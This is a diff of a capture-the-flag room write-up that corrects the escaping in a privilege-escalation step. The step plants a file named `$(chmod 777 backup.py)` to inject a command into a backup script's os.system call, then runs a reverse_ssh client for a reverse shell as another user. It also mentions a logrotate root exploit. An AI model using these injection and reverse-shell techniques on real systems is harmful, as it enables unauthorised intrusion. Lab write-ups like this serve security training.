@@ -52,7 +52,7 @@ A fairly hard room, largely due to the breadth of the enumeration and its numero
                     os.system('/usr/bin/cp "' + root + '/' + file + '" ' + backup_location)
     ```
     
-10. To exploit this, as we have write into `/var/www/uploadedfiles/filedir/`, we can create a file in there like `$(chmod 777 backup.py)`. This can be done with `touch \$\(chmod\ 777\ backup.py)` in that folder. Within a minute, the backup file will be writable by our user.
+10. To exploit this, as we have write into `/var/www/uploadedfiles/filedir/`, we can create a file in there like `$(chmod 777 backup.py)`. This can be done with `touch \$\(chmod\ 777\ backup.py\)` in that folder. Within a minute, the backup file will be writable by our user.
 11. Next, adding `os.system("/var/www/9020/moodle/blocks/rce/lang/en/client")` into backup.py (after removing the chmod file above, as it breaks the script) will get a reverse shell as plot_admin. Note this is using the reverse_ssh client I downloaded with the webshell.
 
 > The following root privesc seemed *real* flaky, and I tried over multiple restarts to get it to work, only persisting once I checked and my approach *is* intended. So, just be aware that this might require a few goes. Best bet I've found is to get in there quick - I've had it work semi-seamlessly if I'm running logrotate 10 minutes after machine boot.
